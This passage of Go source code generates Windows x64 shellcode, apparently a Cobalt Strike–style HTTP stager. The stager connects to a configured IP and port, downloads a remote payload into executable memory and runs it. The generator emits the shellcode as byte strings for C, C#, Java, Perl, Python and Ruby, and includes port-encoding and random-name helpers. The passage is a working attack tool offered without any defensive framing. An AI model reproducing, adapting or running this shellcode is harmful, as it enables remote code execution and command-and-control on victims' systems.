0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x37, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x0b, 0xb9, 0xef, 0x79, 0xfb, 0x79, 0x27, 0x1c, 0xe5, 0x12, 0x75, 0x77, 0x34, 0x36, 0xca, 0x95, 0xc1, 0x35, 0x25, 0x10, 0x39, 0xa8, 0x82, 0x03, 0xbb, 0x9c, 0xe1, 0x70, 0x06, 0xe6, 0x65, 0x3f, 0x37, 0x77, 0x73, 0x11, 0xf6, 0x68, 0xa1, 0x90, 0x04, 0xcd, 0xb8, 0xb7, 0xeb, 0x58, 0x60, 0xf8, 0x36, 0x9c, 0x3f, 0xe2, 0x2b, 0xf0, 0x80, 0xa3, 0xf6, 0xa8, 0x2a, 0x6d, 0x12, 0x84, 0xb9, 0x58, 0xa2, 0x8f, 0xcc, 0x06, 0x7f, 0xd5, 0x6c, 0xdb, 0x80, 0x78, 0xd2, 0xe5, 0xc6, 0x37, 0xee, 0x1a, 0x9d, 0xfb, 0x39, 0xdd, 0x68, 0x41, 0xef, 0x97, 0xdc, 0xc8, 0xc9, 0x3d, 0x00, 0x6d, 0xc8, 0x7f, 0x60, 0x60, 0xf3, 0x21, 0xd0, 0xb1, 0xdc, 0x1a, 0xf0, 0x09, 0x65, 0x12, 0x2b, 0xcc, 0x51, 0xeb, 0xd9, 0x22, 0xbb, 0x5f, 0xb0, 0xaf, 0x13, 0x23, 0x5b, 0x45, 0x0a, 0xfe, 0xd1, 0x33, 0xad, 0xb0, 0x45, 0x92, 0x6d, 0xfe, 0xd0, 0xef, 0x8c, 0xf7, 0xa7, 0x89, 0x1e, 0x20, 0xb9, 0x5f, 0xc6, 0x22, 0x0d, 0x94, 0x60, 0xe1, 0x34, 0xa0, 0xec, 0x7d, 0x56, 0x16, 0xbd, 0x7a, 0x54, 0x8d, 0x63, 0x09, 0x60, 0x18, 0xe3, 0x3a, 0xe2, 0x9a, 0x87, 0xa4, 0xf0, 0xc4, 0x76, 0xdf, 0x55, 0xba, 0xcd, 0xd1, 0xa4, 0xe1, 0xd8, 0x1d, 0xa0, 0xe3, 0xbd, 0xf4, 0x19, 0xfb, 0x77, 0x61, 0x17, 0xa6, 0x5f, 0xe0, 0x62, 0xf6, 0xae, 0x09, 0x94, 0x8f, 0x72, 0x44, 0x8d, 0x56, 0xb2, 0x9c, 0xd8, 0x1a, 0x59, 0x91, 0x02, 0x81, 0x19, 0xb2, 0x40, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Java = Java + fmt.Sprintf("0x%02x,", v)
	}
	Perl := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x64, 0x71, 0x39, 0x4f, 0x00, 0x11, 0xd0, 0x4d, 0x35, 0x4d, 0xe7, 0x20, 0xc3, 0x85, 0xe7, 0xb6, 0x7a, 0x86, 0xb5, 0x2a, 0xc0, 0x2d, 0x9e, 0x3c, 0x00, 0x74, 0x3f, 0x45, 0x06, 0xdf, 0x77, 0xd6, 0x5c, 0x44, 0x86, 0xc8, 0xfb, 0x00, 0x1d, 0x30, 0x02, 0x89, 0x2c, 0x1e, 0xd4, 0x0a, 0x18, 0xdf, 0x30, 0x46, 0x53, 0xf3, 0xa7, 0xad, 0x74, 0xf7, 0x8c, 0x51, 0x44, 0xc1, 0x41, 0x07, 0x5e, 0x02, 0xb1, 0xc4, 0x18, 0x38, 0x82, 0x07, 0x58, 0xef, 0xcd, 0x99, 0x21, 0x44, 0x7a, 0xc1, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4e, 0x50, 0x30, 0x32, 0x29, 0x0d, 0x0a, 0x00, 0x76, 0x6a, 0x5b, 0xa6, 0x32, 0x1d, 0x16, 0xa9, 0x1e, 0x6b, 0x0d, 0x24, 0x3f, 0x0f, 0x82, 0xa5, 0x75, 0x1a, 0x83, 0xe7, 0xb7, 0x78, 0x05, 0xa7, 0x1d, 0x25, 0x6a, 0xa7, 0x7c, 0xcf, 0x74, 0x58, 0x08, 0xb6, 0x65, 0xe0, 0x75, 0x86, 0x93, 0xf4, 0x92, 0x55, 0x9d, 0xdd, 0xe3, 0x10, 0xfe, 0x92, 0x19, 0x39, 0x98, 0xed, 0xd0, 0x5b, 0xa6, 0xba, 0x8c, 0xb9, 0x6b, 0x6f, 0x07, 0x91, 0xf8, 0xf9, 0xa1, 0x47, 0xa5, 0x3f, 0x67, 0xbf, 0xac, 0x05, 0x64, 0xbd, 0x50, 0x80, 0x7f, 0xf7, 0xb7, 0xa9, 0x22, 0x16, 0xb8, 0x5f, 0x08, 0x8c, 0xfc, 0xa5, 0x97, 0xf5, 0x7e, 0x2f, 0xf6, 0x38, 0x0a, 0x6b, 0xee, 0x2a, 0xc0, 0x8c, 0x79, 0xe1, 0x5a, 0x75, 0xf3, 0xfb, 0xd5, 0x04, 0x80, 0xb4, 0xf8, 0x71, 0xf2, 0xe8, 0x68, 0x64, 0xbc, 0x53, 0xd0, 0x98, 0x7f, 0x23, 0x92, 0xea, 0x17, 0xc5, 0xce, 0xc5, 0x2b, 0x17, 0xa6, 0x17, 0x47, 0x95, 0xb6, 0x6a, 0xb6, 0xb6, 0x43, 0xf7, 0x39, 0xba, 0x8d, 0x35, 0xa6, 0x94, 0x10, 0x7c, 0x9d, 0x8a, 0xbf, 0x7e, 0x42, 0x98, 0xf9, 0xde, 0x35, 0x4e, 0xfd, 0x1b, 0x2f, 0x15, 0xda, 0xed, 0xa8, 0x7a, 0x9a, 0x1e, 0x01, 0x20, 0xfb, 0x9d, 0x5e, 0x5d, 0x31, 0x1d, 0x08, 0x63, 0x16, 0xfe, 0xbe, 0x10, 0xe0, 0x6a, 0x41, 0x4a, 0xc7, 0x66, 0x06, 0x1c, 0x86, 0x78, 0x2e, 0x4d, 0xac, 0xbb, 0xa3, 0xab, 0x0b, 0xc6, 0xcf, 0xe8, 0x4f, 0xae, 0xa6, 0x55, 0xab, 0x2d, 0xda, 0x6d, 0x07, 0xcb, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Perl = Perl + fmt.Sprintf("0x%02x,", v)
	}
	Python := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x4a, 0x76, 0x44, 0x59, 0x00, 0x8e, 0x63, 0x0d, 0xc1, 0xc6, 0x67, 0x0d, 0xaf, 0xf0, 0x35, 0x99, 0xcf, 0x20, 0xe8, 0x0e, 0xac, 0xe7, 0x01, 0x64, 0xde, 0xb5, 0x98, 0xbe, 0xb3, 0xb5, 0x3c, 0x14, 0x89, 0x95, 0x60, 0xe0, 0xba, 0x3e, 0x19, 0xc0, 0x4f, 0x5e, 0x20, 0x4d, 0xcd, 0xe2, 0xd8, 0x9c, 0x28, 0x39, 0x06, 0x11, 0x32, 0x11, 0x03, 0x11, 0x05, 0x3f, 0x9e, 0xca, 0xbf, 0x21, 0x09, 0x85, 0x45, 0x29, 0x79, 0xe8, 0x76, 0x01, 0x03, 0xbb, 0xa3, 0x44, 0xea, 0x55, 0x24, 0x65, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x71, 0x64, 0x65, 0x73, 0x6b, 0x20, 0x32, 0x2e, 0x34, 0x2e, 0x31, 0x32, 0x36, 0x33, 0x2e, 0x32, 0x30, 0x33, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0x5e, 0x24, 0xc4, 0x95, 0x06, 0xe2, 0x57, 0x27, 0xa5, 0xda, 0x04, 0x56, 0x5f, 0x34, 0xc5, 0x3b, 0x9a, 0x66, 0xc8, 0xae, 0x8b, 0x95, 0xed, 0x42, 0xb5, 0x0e, 0xb9, 0xdb, 0xd1, 0x72, 0x38, 0x0a, 0x23, 0xe4, 0x87, 0x61, 0x3a, 0xd4, 0x12, 0x41, 0x1f, 0xd2, 0x86, 0x51, 0x65, 0x73, 0x8a, 0x9e, 0xe1, 0xdc, 0xed, 0xe8, 0xe7, 0x7e, 0x4e, 0xcb, 0xa6, 0x4b, 0xa1, 0x69, 0xf8, 0x55, 0x9e, 0x40, 0x7d, 0xe4, 0xf0, 0xdc, 0x74, 0xcd, 0x7b, 0xfa, 0x32, 0x6c, 0x03, 0x94, 0x9d, 0x95, 0xf7, 0x97, 0x2f, 0x00, 0x58, 0x14, 0xa5, 0xfb, 0x54, 0x8e, 0xce, 0xb1, 0x2b, 0x2b, 0xec, 0x1a, 0xf3, 0x83, 0x0a, 0x57, 0xf0, 0x0a, 0xcb, 0xcd, 0x07, 0x5d, 0x6a, 0x3d, 0xc3, 0x1e, 0xaf, 0x0f, 0x60, 0xfd, 0xf8, 0x20, 0xf0, 0x17, 0x72, 0x4d, 0x69, 0x5e, 0xea, 0x6f, 0xd7, 0x94, 0xe3, 0xe0, 0x56, 0x66, 0xd4, 0xd0, 0x2c, 0x76, 0x57, 0xa6, 0xf7, 0x49, 0xca, 0x2d, 0x69, 0x83, 0xa2, 0xd9, 0x4f, 0x63, 0xa1, 0xf0, 0x39, 0x31, 0x9c, 0x31, 0xef, 0x74, 0x9a, 0x2b, 0x7d, 0x5f, 0xc6, 0xfe, 0x29, 0xe8, 0x8c, 0x5e, 0xda, 0x30, 0x4f, 0xcb, 0x87, 0xa6, 0xd7, 0xb2, 0x18, 0x33, 0x98, 0xe5, 0x4b, 0x52, 0x04, 0x13, 0x8d, 0xb9, 0xe0, 0x63, 0x3c, 0x46, 0xb4, 0x70, 0x00, 0x90, 0x8a, 0xe0, 0xd9, 0xe6, 0xc1, 0x0a, 0xcb, 0xe2, 0xe7, 0x08, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Python = Python + fmt.Sprintf("0x%02x,", v)
	}
	Ruby := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x65, 0x48, 0x6c, 0x44, 0x00, 0xc6, 0x02, 0x1a, 0x6c, 0x2d, 0xa0, 0x93, 0xa9, 0xa1, 0x09, 0xf5, 0x27, 0x3e, 0x97, 0x51, 0x8c, 0x5f, 0x78, 0x24, 0x6d, 0x4d, 0x16, 0x8d, 0xab, 0x50, 0xaa, 0xbf, 0x72, 0xad, 0x7d, 0xa3, 0x0e, 0x27, 0x81, 0x9d, 0x52, 0x9e, 0x3c, 0xe7, 0xee, 0x02, 0x8c, 0xa4, 0xb8, 0xac, 0x71, 0x76, 0xbe, 0xa7, 0xbc, 0x2f, 0xd8, 0x5a, 0x21, 0xf9, 0xc2, 0x3a, 0x4b, 0xe9, 0x48, 0x13, 0x6e, 0x19, 0x04, 0x0d, 0x46, 0x8d, 0x8c, 0x05, 0x3b, 0x85, 0x7f, 0xed, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0xfa, 0x55, 0x90, 0x28, 0xcf, 0x12, 0x5e, 0x41, 0xd6, 0xc5, 0x9a, 0xeb, 0x6f, 0x78, 0xc6, 0x87, 0x2e, 0xc7, 0xa3, 0xfb, 0x5f, 0x23, 0xaf, 0x96, 0x73, 0xb7, 0x94, 0x8c, 0xa8, 0xc0, 0x95, 0x0a, 0x1a, 0x09, 0x36, 0xe8, 0x21, 0x57, 0x18, 0xde, 0xf6, 0x18, 0x45, 0x34, 0x81, 0x42, 0x84, 0x3d, 0xcc, 0x85, 0xf6, 0xaf, 0x8b, 0x01, 0xbd, 0xbb, 0x35, 0x37, 0x26, 0x75, 0xb6, 0x5b, 0x35, 0x76, 0x0e, 0xd9, 0xea, 0x59, 0x6e, 0x5c, 0x74, 0x9b, 0xab, 0x91, 0x7f, 0x90, 0x01, 0xcb, 0xfc, 0x02, 0x31, 0xf5, 0xc4, 0xed, 0xe9, 0xb5, 0x6b, 0xaf, 0xe4, 0xfe, 0xf3, 0x3e, 0xf0, 0x30, 0x43, 0x55, 0xbe, 0x03, 0x8a, 0x8e, 0x53, 0x64, 0xe3, 0x36, 0x99, 0x30, 0xb4, 0x26, 0xda, 0xac, 0x1f, 0x5b, 0x41, 0x82, 0x0a, 0x34, 0x4c, 0x45, 0xa4, 0x46, 0xe7, 0xb0, 0x1a, 0x1f, 0x7b, 0xbf, 0xeb, 0x4c, 0xb2, 0x3b, 0x07, 0x73, 0x2f, 0xef, 0xf2, 0x54, 0x38, 0xf6, 0x75, 0xd3, 0xa7, 0x4e, 0xca, 0xa3, 0x98, 0xc2, 0x76, 0xba, 0x3b, 0x81, 0x8a, 0xe8, 0x61, 0xef, 0x1c, 0x28, 0xf0, 0x1c, 0xf2, 0x74, 0x82, 0x5e, 0x56, 0x3a, 0x72, 0x94, 0xa0, 0x8a, 0xda, 0xc2, 0xb9, 0x4c, 0x4d, 0x7c, 0x0f, 0xe9, 0x4b, 0xd5, 0x4e, 0xa1, 0xd6, 0x73, 0x9f, 0x71, 0x5a, 0x11, 0xa5, 0x82, 0xe6, 0x40, 0x52, 0x6f, 0xf8, 0xbe, 0xd1, 0x9d, 0xa5, 0x56, 0x6e, 0xe7, 0x71, 0x9a, 0x9d, 0xcd, 0x6f, 0x57, 0xad, 0x95, 0xf2, 0x7e, 0x48, 0x11, 0x94, 0x01, 0xbb, 0xa1, 0xb7, 0x58, 0xcd, 0xe1, 0xd3, 0x73, 0x2d, 0x65, 0x9d, 0x64, 0x27, 0x28, 0xe6, 0xd5, 0xcd, 0x26, 0x56, 0x31, 0xce, 0x29, 0xe6, 0x6a, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Ruby = Ruby + fmt.Sprintf("0x%02x,", v)
	}
	return CS_Shellcode{
		C,
		Cs,
		Java,
		Perl,
		Python,
		Ruby,
	}
}

func Port_byte_rec_IntToBytes(port int) []byte {
	x := int32(port)
	y := []byte{}
	bytesBuffer := bytes.NewBuffer([]byte{})
	binary.Write(bytesBuffer, binary.BigEndian, x)
	y = append(y, bytesBuffer.Bytes()[2:][1], bytesBuffer.Bytes()[2:][0])
	return y
}

func RandomString(n int) string { // 随机名字
	var letters = []byte("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	result := make([]byte, n)
	rand.Seed(time.Now().Unix())
	for k := range result {
		result[k] = letters[rand.Intn(len(letters))]
	}
	return string(result)
}
